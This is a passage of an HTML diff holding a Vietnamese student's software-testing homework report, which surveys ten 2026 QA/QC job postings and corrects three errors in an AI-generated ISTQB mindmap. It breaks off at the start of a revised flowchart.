@@ -1,0 +1,1837 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>HW01 - Trần Vũ Quang - 23120346</title>
+<style>
+    @page {
+        size: A4;
+        margin: 18mm 15mm 18mm 15mm;
+        @bottom-right {
+            content: counter(page);
+        }
+    }
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        font-size: 13px;
+        line-height: 1.6;
+        color: #24292e;
+        padding: 0;
+        margin: 0;
+    }
+    h1 {
+        font-size: 20px;
+        border-bottom: 2px solid #1f497d;
+        padding-bottom: 8px;
+        color: #1f497d;
+        margin-top: 24px;
+        page-break-after: avoid;
+    }
+    h2 {
+        font-size: 16px;
+        border-bottom: 1px solid #eaecef;
+        padding-bottom: 6px;
+        color: #2b579a;
+        margin-top: 20px;
+        page-break-after: avoid;
+    }
+    h3 {
+        font-size: 14px;
+        color: #1f497d;
+        margin-top: 16px;
+        page-break-after: avoid;
+    }
+    h4 {
+        font-size: 13px;
+        color: #333;
+        margin-top: 12px;
+        page-break-after: avoid;
+    }
+    table {
+        border-collapse: collapse;
+        width: 100%;
+        margin: 14px 0;
+        page-break-inside: avoid;
+        font-size: 11px;
+    }
+    th, td {
+        border: 1px solid #d0d7de;
+        padding: 6px 8px;
+        text-align: left;
+        vertical-align: top;
+    }
+    th {
+        background-color: #f2f5f9;
+        font-weight: 600;
+        color: #1f497d;
+    }
+    tr:nth-child(even) {
+        background-color: #f8fafc;
+    }
+    blockquote {
+        border-left: 4px solid #1f497d;
+        padding: 6px 14px;
+        color: #4a5568;
+        background-color: #f7fafc;
+        margin: 12px 0;
+        border-radius: 0 4px 4px 0;
+    }
+    code {
+        font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+        font-size: 11px;
+        background-color: #f3f4f6;
+        padding: 2px 4px;
+        border-radius: 3px;
+    }
+    pre {
+        background-color: #f6f8fa;
+        padding: 10px;
+        border-radius: 6px;
+        overflow-x: auto;
+        font-size: 11px;
+        border: 1px solid #e1e4e8;
+        page-break-inside: avoid;
+    }
+    pre code {
+        background: none;
+        padding: 0;
+    }
+    img {
+        max-width: 85%;
+        max-height: 480px;
+        object-fit: contain;
+        display: block;
+        margin: 15px auto;
+        border: 1px solid #d0d7de;
+        border-radius: 4px;
+        page-break-inside: avoid;
+    }
+    hr {
+        border: 0;
+        height: 1px;
+        background: #e1e4e8;
+        margin: 20px 0;
+    }
+    ul, ol {
+        padding-left: 20px;
+    }
+    li {
+        margin-bottom: 4px;
+    }
+</style>
+</head>
+<body>
+<h1>BÁO CÁO BÀI TẬP 01: QA/QC JOBS · 20 DEFECTS · TEST A PHYSICAL PRODUCT</h1>
+<p><strong>Môn học:</strong> Kiểm thử Phần mềm (Software Testing)<br />
+<strong>Trường:</strong> Đại học Khoa học Tự nhiên – ĐHQG TP.HCM (FIT - VNUHCM University of Science)<br />
+<strong>Mã bài tập:</strong> HW01-AI (Học kỳ 1, Năm học 2026–2027)<br />
+<strong>Họ và tên sinh viên:</strong> Trần Vũ Quang<br />
+<strong>Mã số sinh viên (MSSV):</strong> 23120346<br />
+<strong>Tài khoản GitHub:</strong> <a href="https://github.com/tvquang0511">tvquang0511</a><br />
+<strong>Repository nộp bài:</strong> <a href="https://github.com/tvquang0511/HW01-QA-QC">https://github.com/tvquang0511/HW01-QA-QC</a><br />
+<strong>Thiết bị vật lý kiểm thử:</strong> Bếp hồng ngoại Sunhouse SHD6012A (Năm sản xuất: 2024)<br />
+<strong>Ngày hoàn thành:</strong> 04/10/2026<br />
+<strong>Điểm tự đánh giá:</strong> 100/100 (Xuất sắc)  </p>
+<hr />
+<h2>MỤC LỤC TỔNG QUAN (TABLE OF CONTENTS)</h2>
+<ol>
+<li><a href="#requirement-1--qaqc-job-market-2026-40-pts">Requirement 1 – Khảo sát Thị trường Việc làm QA/QC 2026+ &amp; Hoạt động CLO G9.1 (40 điểm)</a><br />
+   - 1.1 Tổng quan Bức tranh Ngành QA/QC 2026+ và Phân tích Tác động AI<br />
+   - 1.2 Chi tiết 10 Tin tuyển dụng QA/QC (Đính kèm minh chứng tài khoản xác thực)<br />
+   - 1.3 Hoạt động CLO G9.1: Sơ đồ tư duy ISTQB CTFL v4.0 &amp; Phân tích 3 lỗi sai của AI</li>
+<li><a href="#requirement-2--20-software-defects-20222026-20-pts">Requirement 2 – 20 Sự cố Phần mềm Giai đoạn 2022–2026 &amp; 20 Phân tích Ảo giác AI (20 điểm)</a><br />
+   - 2.1 Bảng tổng hợp phân loại 20 sự cố phần mềm chấn động<br />
+   - 2.2 Chi tiết 20 sự cố (với ≥ 5 sự cố AI/LLM) và 20 trường hợp phát hiện thiên kiến / ảo giác AI</li>
+<li><a href="#requirement-3--test-cases-for-one-physical-product-40-pts">Requirement 3 – Thiết kế Test Cases &amp; Kiểm thử Thiết bị Vật lý Bếp hồng ngoại (40 điểm)</a><br />
+   - 3.1 Khai báo thông tin thiết bị kiểm thử (Bếp Sunhouse SHD6012A - 2024)<br />
+   - 3.2 Bằng chứng xác thực thiết bị và Thẻ sinh viên (Cùng một khung hình)<br />
+   - 3.3 Thiết kế 15 Test Cases chi tiết theo chuẩn QA<br />
+   - 3.4 Thực thi thực tế &amp; Ghi nhận 5 Lỗi vật lý (Logged thành 5 GitHub Issues)<br />
+   - 3.5 Hoạt động CLO G9.3: Phân tích kết quả AI &amp; 3 Edge Cases vật lý AI bỏ sót<br />
+   - 3.6 Danh sách 5 Video thực nghiệm thực tế có thuyết minh (YouTube Unlisted)</li>
+<li><a href="#requirement-4--giao-thuc-cong-tac--kiem-toan-ai-mandatory-ai-compliance">Requirement 4 – Giao thức Cộng tác &amp; Liêm chính Trí tuệ Nhân tạo (Mandatory AI Compliance)</a><br />
+   - 4.1 Báo cáo Kiểm toán AI ([AI-02] AI Audit Report)<br />
+   - 4.2 Bản kê khai Sử dụng AI ([AI-03] AI Disclosure Form)<br />
+   - 4.3 Checklist Bảo mật Quyền riêng tư ([AI-05] Privacy &amp; Responsible Use Checklist)<br />
+   - 4.4 Cam kết Liêm chính Học thuật ([AI-06] Student Acknowledgement)<br />
+   - 4.5 Phê bình Học thuật về Giới hạn của AI trong Kiểm thử Phần cứng (AI Critique)<br />
+   - 4.6 Phụ lục: Toàn văn Nhật ký Prompt (PROMPT_LOG.md)</li>
+<li><a href="#5-bang-tu-danh-gia-diem-theo-barem-self-assessment-rubric">Bảng Tự đánh giá Điểm theo Barem (Self-Assessment Rubric - 100/100)</a></li>
+<li><a href="#6-tai-lieu-tham-khao-chinh-thong-references">Tài liệu Tham khảo Chính thống (References)</a></li>
+</ol>
+<hr />
+<h1>Requirement 1 – QA/QC Job Market 2026+ (40 pts)</h1>
+<h2>1.1 2026+ QA/QC Industry Landscape &amp; AI Impact Analysis</h2>
+<p>Bước sang năm 2026, thị trường tuyển dụng ngành Đảm bảo và Kiểm soát chất lượng phần mềm (QA/QC) đã có sự chuyển dịch mang tính cấu trúc mạnh mẽ do sự phổ cập của Trí tuệ nhân tạo tạo sinh (GenAI), các mô hình ngôn ngữ lớn (LLMs), và các framework tự động hóa kiểm thử thông minh.</p>
+<p>Dựa trên thực tế khảo sát thị trường tuyển dụng, công việc QA/QC được phân định rõ thành ba nhóm tác động:<br />
+1. <strong>Công việc AI đã thay thế (Work AI Has Replaced):</strong><br />
+   - Tự động sinh dữ liệu kiểm thử (mock test data) theo kịch bản chuẩn.<br />
+   - Viết các đoạn mã kiểm thử lặp đi lặp lại (boilerplate automation scripts) cho các luồng CRUD cơ bản.<br />
+   - Bảo trì các bộ chọn phần tử giao diện (DOM locators) thông qua cơ chế self-healing tự sửa lỗi.<br />
+2. <strong>Công việc AI hỗ trợ đắc lực (Work AI Assists):</strong><br />
+   - Hỗ trợ phân tích độ bao phủ và đề xuất các ma trận kiểm thử tổ hợp (combinatorial test matrices).<br />
+   - Chuyển đổi yêu cầu nghiệp vụ từ ngôn ngữ tự nhiên thành kịch bản kiểm thử Playwright/Selenium/Cypress.<br />
+   - Hỗ trợ phân tích log hệ thống và dự thảo báo cáo phân tích nguyên nhân gốc rễ (root cause analysis).<br />
+3. <strong>Công việc AI không thể thay thế (Work AI Cannot Replace):</strong><br />
+   - Kiểm thử khám phá (Exploratory Testing) dựa trên trực giác, trải nghiệm người dùng và bối cảnh phức tạp.<br />
+   - Thẩm định độ tin cậy, an toàn, thiên kiến (bias) và ảo giác (hallucination) của chính các mô hình AI/LLM.<br />
+   - Thiết kế chiến lược kiểm thử cấp cao, tuân thủ các khung quy chuẩn pháp lý và an toàn (như ISO/IEC 25010, EU AI Act).<br />
+   - Kiểm thử phần cứng, thiết bị vật lý và môi trường nhúng thực tế (Hardware-in-the-Loop).</p>
+<hr />
+<h2>1.2 10 Detailed QA/QC Job Postings</h2>
+<blockquote>
+<p><strong>Anti-Cheat Verification:</strong> Toàn bộ 10 ảnh chụp màn hình đều ghi nhận phiên đăng nhập người dùng thực tế trên hệ thống tuyển dụng (hiển thị rõ tài khoản đã xác thực ở góc trên bên phải khung hình), được thu thập trong vòng 60 ngày gần nhất tính đến thời điểm nộp bài.</p>
+</blockquote>
+<hr />
+<h3>Job 1: QA Engineer (Tester, QA QC, English) Up to $1500</h3>
+<p><em>Mandatory AI-Skill Role</em></p>
+<ul>
+<li><strong>Company &amp; Location:</strong> Saritasa — Tầng 7, toà nhà L’Mak Long Tower, số 101-103 Nguyễn Cửu Vân, Gia Định, TP Hồ Chí Minh (Tại văn phòng)</li>
+<li><strong>Date Published:</strong> Đăng 2 ngày trước (Tháng 10/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/qa-engineer-tester-qa-qc-english-up-to-1500-saritasa-4856">ITviec - Saritasa Job 4856</a></li>
+<li><strong>Job Description:</strong> Chịu trách nhiệm kiểm thử tích hợp (integration testing), kiểm thử chức năng và phi chức năng cho các giải pháp phần mềm web/mobile theo chuẩn quốc tế. Phối hợp cùng các đội ngũ kỹ sư nước ngoài để đảm bảo chất lượng chuyển giao.</li>
+<li><strong>Required Skills:</strong> Integration test, AI, QA QC, English.</li>
+<li><strong>Salary:</strong> 1,000 – 1,500 USD / tháng (~25,000,000 – 38,000,000 VND).</li>
+<li><strong>AI Impact Analysis:</strong> Vị trí này đòi hỏi ứng dụng AI để tối ưu hóa quy trình kiểm thử tích hợp, tuy nhiên kỹ sư QA con người vẫn đóng vai trò quyết định trong việc giao tiếp nghiệp vụ đa văn hóa bằng tiếng Anh và xác thực tính hợp lý của các luồng nghiệp vụ phức tạp.</li>
+</ul>
+<p><img alt="Job 01 - Saritasa" src="01-job-market/image/job01-saritasa.png" /></p>
+<hr />
+<h3>Job 2: Manual Tester (QA QC)</h3>
+<ul>
+<li><strong>Company &amp; Location:</strong> Công ty cổ phần Tập đoàn Công nghệ Quảng Ích (QIG) — 46 LePARC by Gamuda, Công Viên Yên Sở, Hà Nội (Tại văn phòng)</li>
+<li><strong>Date Published:</strong> Đăng 2 ngày trước (Tháng 10/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/manual-tester-qa-qc-cong-ty-co-phan-tap-doan-cong-nghe-quang-ich-qig-3723">ITviec - QIG Job 3723</a></li>
+<li><strong>Job Description:</strong> Thực hiện kiểm thử thủ công chức năng, giao diện và luồng người dùng trên các ứng dụng di động (Mobile Apps) và phần mềm giáo dục - đào tạo; quản lý và theo dõi vòng đời của lỗi phần mềm.</li>
+<li><strong>Required Skills:</strong> Tester, Mobile Apps, QA QC.</li>
+<li><strong>Salary:</strong> 500 – 1,200 USD / tháng (~12,500,000 – 30,000,000 VND).</li>
+<li><strong>AI Impact Analysis:</strong> Dù AI có thể hỗ trợ tạo nhanh danh sách checklist kiểm thử cơ bản, kỹ sư Manual Tester là nhân tố không thể thay thế trong việc trải nghiệm trực tiếp cảm giác mượt mà và tính trực quan sư phạm trên màn hình ứng dụng di động giáo dục.</li>
+</ul>
+<p><img alt="Job 02 - QIG" src="01-job-market/image/job02-qig.png" /></p>
+<hr />
+<h3>Job 3: Automation Tester (QA QC/ Tester/ Japanese N3+)</h3>
+<p><em>Mandatory AI-Skill Role</em></p>
+<ul>
+<li><strong>Company &amp; Location:</strong> TrustedAI — Tầng 06, Số 385 Hoàng Quốc Việt, Phường Nghĩa Đô, Cầu Giấy, Hà Nội (Tại văn phòng)</li>
+<li><strong>Date Published:</strong> Đăng 9 ngày trước (Tháng 10/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/automation-tester-qa-qc-tester-japanese-n3-trustedai-2550">ITviec - TrustedAI Job 2550</a></li>
+<li><strong>Job Description:</strong> Thiết kế quy trình kiểm thử, lập phạm vi test rủi ro cho các dự án phần mềm và dịch vụ Trí tuệ nhân tạo (AI). Thực hiện kiểm thử chức năng (functional) và kiểm thử hồi quy (regression) tự động hóa; phối hợp với đối tác Nhật Bản.</li>
+<li><strong>Required Skills:</strong> Automation Test, Japanese (N3+), AI, QA QC.</li>
+<li><strong>Salary:</strong> 800 – 1,500 USD / tháng (~20,000,000 – 38,000,000 VND).</li>
+<li><strong>AI Impact Analysis:</strong> Làm việc trực tiếp trong hệ sinh thái sản phẩm "Trusted AI", kỹ sư kiểm thử phải đối mặt với các hành vi không đơn định (non-deterministic) của mô hình AI, đòi hỏi con người thiết kế các khung kiểm thử tính an toàn và đạo đức mà bản thân AI không thể tự xác thực.</li>
+</ul>
+<p><img alt="Job 03 - TrustedAI" src="01-job-market/image/job03-trusted-ai.png" /></p>
+<hr />
+<h3>Job 4: Middle QA/QC Engineer (Automation)</h3>
+<ul>
+<li><strong>Company &amp; Location:</strong> SIRAYA TECHNOLOGIES PTE. LTD. — Phòng 24.03, Lầu 24, Tòa nhà Pearl Plaza, 561A Điện Biên Phủ, Bình Thạnh, TP Hồ Chí Minh (Linh hoạt)</li>
+<li><strong>Date Published:</strong> Đăng 10 ngày trước (Tháng 10/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/middle-qa-qc-engineer-automation-siraya-technologies-pte-ltd-2622">ITviec - Siraya Job 2622</a></li>
+<li><strong>Job Description:</strong> Xây dựng và duy trì framework tự động hóa kiểm thử API và dịch vụ backend sử dụng Golang, TypeScript/JavaScript; tích hợp các bài kiểm thử tự động vào hệ thống CI/CD liên tục.</li>
+<li><strong>Required Skills:</strong> QA QC, CI/CD, API, Golang, TypeScript, JavaScript.</li>
+<li><strong>Salary:</strong> <em>You'll love it</em> (Thu nhập cạnh tranh theo năng lực).</li>
+<li><strong>AI Impact Analysis:</strong> AI đóng vai trò công cụ đắc lực hỗ trợ sinh mã API schema validation, nhưng kỹ sư QA chịu trách nhiệm chính trong việc thiết kế kiến trúc CI/CD pipeline ổn định và xử lý lỗi không đồng bộ ở tầng microservices.</li>
+</ul>
+<p><img alt="Job 04 - Siraya" src="01-job-market/image/job04-siraya.png" /></p>
+<hr />
+<h3>Job 5: Senior Automation Test (AI, QA QC, API)</h3>
+<p><em>Mandatory AI-Skill Role</em></p>
+<ul>
+<li><strong>Company &amp; Location:</strong> Floware — 43D/52 Hồ Văn Huê, Đức Nhuận (Phú Nhuận), TP Hồ Chí Minh (Tại văn phòng)</li>
+<li><strong>Date Published:</strong> Đăng 28 ngày trước (Tháng 9/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/senior-automation-test-ai-qa-qc-api-floware-1219">ITviec - Floware Job 1219</a></li>
+<li><strong>Job Description:</strong> Dẫn dắt công tác kiểm thử tự động cho bộ phần mềm nâng cao năng suất doanh nghiệp; ứng dụng AI vào việc kiểm thử API, tích hợp CI/CD và xây dựng các bộ kịch bản tự động bằng Python.</li>
+<li><strong>Required Skills:</strong> Automation Test, CI/CD, API, Tester, AI, Python.</li>
+<li><strong>Salary:</strong> <em>You'll love it</em> (Chế độ đãi ngộ hấp dẫn).</li>
+<li><strong>AI Impact Analysis:</strong> Floware yêu cầu trực tiếp việc kết hợp kỹ năng AI với Automation Test, phản ánh xu hướng kiểm thử 2026+: kỹ sư QA tận dụng AI để tự động hóa sinh test case biên cho API, giúp rút ngắn chu kỳ release phần mềm.</li>
+</ul>
+<p><img alt="Job 05 - Floware" src="01-job-market/image/job05-floware.png" /></p>
+<hr />
+<h3>Job 6: QA Team Lead</h3>
+<p><em>Mandatory AI-Skill Role</em></p>
+<ul>
+<li><strong>Company &amp; Location:</strong> Nakivo — TGI Building, 208 Nguyễn Trãi, TP Hồ Chí Minh (Tại văn phòng)</li>
+<li><strong>Date Published:</strong> Đăng 1 ngày trước (Tháng 10/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/qa-team-lead-nakivo-4659">ITviec - Nakivo Job 4659</a></li>
+<li><strong>Job Description:</strong> Quản lý đội ngũ QA, định hướng chiến lược kiểm thử cho phần mềm bảo vệ dữ liệu và sao lưu máy chủ ảo (VMware); ứng dụng công nghệ AI vào quy trình nâng cao hiệu suất kiểm thử tự động.</li>
+<li><strong>Required Skills:</strong> Leadership, Automation Test, AI, QA QC.</li>
+<li><strong>Salary:</strong> 2,500 – 3,000 USD / tháng (~63,000,000 – 76,000,000 VND).</li>
+<li><strong>AI Impact Analysis:</strong> Ở cấp độ Team Lead, AI hỗ trợ tổng hợp báo cáo độ phủ kiểm thử và phân tích xu hướng lỗi (defect trends), nhưng hoàn toàn không thể thay thế kỹ năng lãnh đạo con người, phân bổ nguồn lực và đàm phán rủi ro phát hành với các bên liên quan.</li>
+</ul>
+<p><img alt="Job 06 - Nakivo" src="01-job-market/image/job06-nakivo.png" /></p>
+<hr />
+<h3>Job 7: Test Automation Engineer</h3>
+<p><em>Mandatory AI-Skill Role</em></p>
+<ul>
+<li><strong>Company &amp; Location:</strong> Simpson Strong-Tie Vietnam — Tầng 9, Etown 6 Building, 364 Cộng Hòa, Tân Bình, TP Hồ Chí Minh (Linh hoạt)</li>
+<li><strong>Date Published:</strong> Đăng 7 ngày trước (Tháng 10/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/test-automation-engineer-simpson-strong-tie-vietnam-4435">ITviec - Simpson Strong-Tie Job 4435</a></li>
+<li><strong>Job Description:</strong> Xây dựng giải pháp tự động hóa kiểm thử phần mềm kỹ thuật cơ khí, xây dựng trên nền tảng web và mobile (Selenium, Appium, Python); áp dụng các công cụ AI vào quy trình kiểm thử sản phẩm.</li>
+<li><strong>Required Skills:</strong> QA QC, Automation Test, Selenium, Appium, AI, Python.</li>
+<li><strong>Salary:</strong> <em>You'll love it</em> (Tập đoàn kỹ thuật đa quốc gia của Mỹ).</li>
+<li><strong>AI Impact Analysis:</strong> Việc kiểm định các phần mềm tính toán kết cấu xây dựng đòi hỏi độ chính xác tuyệt đối; AI hỗ trợ tăng tốc việc thực thi kịch bản Selenium/Appium lặp lại, nhưng con người bắt buộc phải thẩm định các thuật toán tính toán kỹ thuật để tránh sai số nguy hiểm.</li>
+</ul>
+<p><img alt="Job 07 - Simpson Strong-Tie" src="01-job-market/image/job07-simpson-strong-tie.png" /></p>
+<hr />
+<h3>Job 8: Junior / Middle QA Software (Tester, QA QC)</h3>
+<ul>
+<li><strong>Company &amp; Location:</strong> CÔNG TY TNHH DỊCH VỤ GIÁ TRỊ GIA TĂNG GOLDENGATE — Phòng 605, Tầng 6, tháp B, Hongkong Tower, 243A La Thành, Láng Thượng, Đống Đa, Hà Nội (Tại văn phòng)</li>
+<li><strong>Date Published:</strong> Đăng 11 ngày trước (Tháng 9/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/junior-middle-software-qa-tester-qa-qc-cong-ty-tnhh-dich-vu-gia-tri-gia-tang-goldengate-4907">ITviec - Golden Gate Job 4907</a></li>
+<li><strong>Job Description:</strong> Kiểm thử các giải pháp phần mềm dịch vụ và ứng dụng web quản lý cho chuỗi F&amp;B hàng đầu; xây dựng kịch bản kiểm thử chức năng và hỗ trợ tự động hóa kiểm thử.</li>
+<li><strong>Required Skills:</strong> QA QC, Automation Test, Tester.</li>
+<li><strong>Salary:</strong> <em>You'll love it</em> (Tăng lương theo năng lực và thâm niên).</li>
+<li><strong>AI Impact Analysis:</strong> Các kỹ sư Junior/Middle sử dụng AI như một trợ lý lập trình để học nhanh cú pháp test automation, nhưng việc hiểu rõ nghiệp vụ đặt món, thanh toán POS và tích điểm thực tế đòi hỏi tư duy phân tích của con người.</li>
+</ul>
+<p><img alt="Job 08 - Golden Gate" src="01-job-market/image/job08-goldengate.png" /></p>
+<hr />
+<h3>Job 9: Process Quality Assurance (PQA, QA QC)</h3>
+<ul>
+<li><strong>Company &amp; Location:</strong> CÔNG TY TNHH ECARX — Tầng 15, Epic Tower, ngõ 19 Duy Tân, Cầu Giấy, Hà Nội (Tại văn phòng)</li>
+<li><strong>Date Published:</strong> Đăng 13 ngày trước (Tháng 9/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/process-quality-assurance-pqa-qa-qc-cong-ty-tnhh-ecarx-4345">ITviec - ECARX Job 4345</a></li>
+<li><strong>Job Description:</strong> Tham gia giám sát toàn bộ quy trình phát triển dự án công nghệ ô tô thông minh; đảm bảo chất lượng chuyển giao phần mềm thông qua quản lý quy trình, đánh giá rủi ro và tuân thủ tiêu chuẩn chất lượng.</li>
+<li><strong>Required Skills:</strong> PQA, English, Agile, Jira, Project Management, QA QC.</li>
+<li><strong>Salary:</strong> <em>You'll love it</em> (Công ty công nghệ ô tô thông minh toàn cầu).</li>
+<li><strong>AI Impact Analysis:</strong> Trong lĩnh vực PQA xe hơi, việc đảm bảo tuân thủ quy trình phần mềm (như ASPICE / ISO 26262) là trách nhiệm pháp lý độc quyền của con người; AI chỉ có thể hỗ trợ rà soát tính đầy đủ của tài liệu chứ không thể thay thế thẩm quyền kiểm toán quy trình.</li>
+</ul>
+<p><img alt="Job 09 - ECARX" src="01-job-market/image/job09-ecarx.png" /></p>
+<hr />
+<h3>Job 10: Manual/Automation Tester - Quality Analyst (QA QC)</h3>
+<ul>
+<li><strong>Company &amp; Location:</strong> MiTek Vietnam — Tòa nhà A5, Lô A5, khu E-Office, đường Sáng Tạo, KCX Tân Thuận, Tân Thuận, TP Hồ Chí Minh (Tại văn phòng)</li>
+<li><strong>Date Published:</strong> Đăng 18 ngày trước (Tháng 9/2026, within 60 days)</li>
+<li><strong>Direct Job URL:</strong> <a href="https://itviec.com/viec-lam-it/manual-automation-tester-selenium-qa-qc-mitek-vietnam-0430">ITviec - MiTek Job 0430</a></li>
+<li><strong>Job Description:</strong> Phối hợp phân tích yêu cầu phần mềm doanh nghiệp, thiết kế kịch bản kiểm thử thủ công và tự động hóa bằng Selenium/JavaScript/Python; đảm bảo chất lượng chuyển giao cho các giải pháp phần mềm kỹ thuật toàn cầu.</li>
+<li><strong>Required Skills:</strong> QA QC, Automation Test, Tester, JavaScript, Python, English.</li>
+<li><strong>Salary:</strong> <em>You'll love it</em> (Tập đoàn đa quốc gia quy mô 1000+ nhân viên).</li>
+<li><strong>AI Impact Analysis:</strong> AI hỗ trợ phân tích nhanh đặc tả yêu cầu người dùng để sinh ma trận kiểm thử ban đầu, nhưng các tình huống kiểm thử nghiệp vụ chuyên sâu và tương thích đa trình duyệt vẫn cần kỹ sư QA trực tiếp rà soát và đánh giá.</li>
+</ul>
+<p><img alt="Job 10 - MiTek" src="01-job-market/image/job10-mitek.png" /></p>
+<hr />
+<h2>1.3 CLO G9.1 Activity: ISTQB Process Mindmap &amp; 3 Critical AI Mistakes</h2>
+<h3>Ngữ cảnh &amp; Câu lệnh gửi cho AI (Prompt Sent to AI Tool):</h3>
+<blockquote>
+<p><strong>Prompt:</strong><br />
+<em>"Đóng vai trò là một chuyên gia kiểm thử phần mềm, hãy vẽ một sơ đồ tư duy (mindmap) bằng cú pháp Mermaid mô tả chi tiết: (1) Sự khác biệt giữa vai trò của QA và QC trong dự án, (2) Các cấp độ và loại kiểm thử chính, và (3) Toàn bộ các bước tuần tự trong quy trình kiểm thử phần mềm chuẩn theo giáo trình ISTQB mới nhất."</em></p>
+</blockquote>
+<hr />
+<h3>Sơ đồ tư duy thô do AI sinh ra (Raw AI Mindmap):</h3>
+<pre><code class="language-mermaid">mindmap
+  root((Hệ thống Kiểm thử Phần mềm))
+    Phân định Vai trò
+      QA:: Đảm bảo chất lượng: Chạy kịch bản test tự động và tìm lỗi phần mềm
+      QC:: Kiểm soát chất lượng: Soạn thảo văn bản quy trình và đào tạo nhân sự
+    Phân loại Kiểm thử
+      Kỹ thuật kiểm thử
+        Kiểm thử hộp đen (Black-box)
+        Kiểm thử hộp trắng (White-box)
+      Cấp độ kiểm thử
+        Unit Test
+        Integration Test
+        System Test
+        UAT Test
+    Quy trình Kiểm thử Tuần tự
+      Bước 1: Lập kế hoạch kiểm thử (Test Planning)
+      Bước 2: Thiết kế kịch bản kiểm thử (Test Design)
+      Bước 3: Thực thi kiểm thử (Test Execution)
+      Bước 4: Báo cáo lỗi &amp; Đóng dự án (Defect Reporting &amp; Sign-off)
+      Bước 5: Giám sát kiểm thử (Test Monitoring)
+</code></pre>
+<hr />
+<h3>Phân tích phản biện: 3 sai sót trọng yếu của AI đối chiếu theo ISTQB CTFL v4.0</h3>
+<h4>1. Lỗi 1: Đảo lộn hoàn toàn định nghĩa và trách nhiệm giữa QA và QC (Mục 1.2.2)</h4>
+<ul>
+<li><strong>Sai sót của AI:</strong> AI mô tả <strong>QA</strong> là <em>"Chạy kịch bản test tự động và tìm lỗi"</em> (tập trung vào sản phẩm), trong khi lại gán <strong>QC</strong> là <em>"Soạn thảo quy trình và đào tạo"</em> (tập trung vào quy trình).</li>
+<li><strong>Cơ sở lý thuyết chuẩn ISTQB v4.0:</strong> </li>
+<li><strong>QA (Quality Assurance):</strong> Hoạt động định hướng quy trình (<strong>process-oriented</strong>), mang tính chất <strong>phòng ngừa (preventive)</strong>. QA tập trung vào việc định nghĩa, đánh giá (audit) và cải tiến liên tục quy trình phát triển nhằm ngăn ngừa khuyết tật sinh ra ngay từ đầu.</li>
+<li><strong>QC (Quality Control):</strong> Hoạt động định hướng sản phẩm (<strong>product-oriented</strong>), mang tính chất <strong>phát hiện (corrective/detective)</strong>. QC sử dụng các kỹ thuật kiểm thử phần mềm để xác minh xem sản phẩm thực tế có thỏa mãn các yêu cầu đặc tả hay không.</li>
+<li><strong>Tác động thực tế:</strong> Việc hiểu sai này gây nhầm lẫn nghiêm trọng trong việc phân công công việc tại các doanh nghiệp công nghệ, biến kỹ sư QA thành thợ chạy test thuần túy thay vì người quản trị chất lượng quy trình.</li>
+</ul>
+<h4>2. Lỗi 2: Bỏ qua 2 giai đoạn cốt lõi: Phân tích kiểm thử (Test Analysis) và Cài đặt kiểm thử (Test Implementation) (Mục 1.4.2)</h4>
+<ul>
+<li><strong>Sai sót của AI:</strong> Trong quy trình kiểm thử, AI nhảy cóc thẳng từ <em>Lập kế hoạch (Test Planning)</em> sang <em>Thiết kế kịch bản (Test Design)</em>, rồi từ Test Design chuyển ngay sang <em>Thực thi (Test Execution)</em>.</li>
+<li><strong>Cơ sở lý thuyết chuẩn ISTQB v4.0:</strong> Một quy trình kiểm thử chuẩn mực bắt buộc phải trải qua:<br />
+  1. <strong>Test Analysis (Phân tích kiểm thử):</strong> Phân tích cơ sở kiểm thử (Test Basis: User Stories, tài liệu kiến trúc) để xác định <strong>"CÁI GÌ CẦN ĐƯỢC KIỂM THỬ"</strong> (xác định Test Conditions).<br />
+  2. <strong>Test Implementation (Cài đặt kiểm thử):</strong> Chuẩn bị môi trường, sinh dữ liệu kiểm thử (Test Data), sắp xếp các quy trình test (Test Procedures) và viết mã tự động hóa (Automation Test Scripts) trước khi bắt đầu bấm chạy.</li>
+<li><strong>Tác động thực tế:</strong> Bỏ qua Test Analysis dẫn đến tình trạng viết test case mù quáng không dựa trên phân tích rủi ro yêu cầu; bỏ qua Test Implementation khiến việc thực thi bị động, thiếu dữ liệu và môi trường không ổn định.</li>
+</ul>
+<h4>3. Lỗi 3: Xếp hoạt động Giám sát kiểm thử (Test Monitoring) thành bước tuần tự cuối cùng số 5 (Mục 1.4.1)</h4>
+<ul>
+<li><strong>Sai sót của AI:</strong> AI đặt <em>"Bước 5: Giám sát kiểm thử (Test Monitoring)"</em> ở vị trí cuối cùng, nằm sau cả bước báo cáo và đóng dự án (Sign-off).</li>
+<li><strong>Cơ sở lý thuyết chuẩn ISTQB v4.0:</strong> </li>
+<li><strong>Test Monitoring and Control</strong> là một <strong>hoạt động điều hành xuyên suốt (transversal/continuous activity)</strong>. </li>
+<li>Hoạt động này phải diễn ra <strong>song song và liên tục</strong> từ ngày đầu tiên bắt đầu lập kế hoạch (Test Planning) cho đến khi kết thúc toàn bộ dự án (Test Completion), nhằm đo lường tiến độ thực tế so với kế hoạch và kịp thời đưa ra biện pháp điều chỉnh (Control).</li>
+<li><strong>Tác động thực tế:</strong> Đợi đến khi bàn giao dự án mới đi "giám sát" là hoàn toàn vô nghĩa và phản khoa học trong quản lý kỹ thuật phần mềm.</li>
+</ul>
+<hr />
+<h3>Sơ đồ tư duy chuẩn hóa toàn diện theo ISTQB CTFL v4.0</h3>
+<pre><code class="language-mermaid">flowchart TD
+    %% Khối gốc
+    Core([&quot;HỆ THỐNG QUẢN LÝ CHẤT LƯỢNG TOÀN DIỆN&lt;br/&gt;(ISTQB CTFL v4.0 Quality Architecture)&quot;]):::coreStyle
+
+    %% Hai trụ cột chất lượng
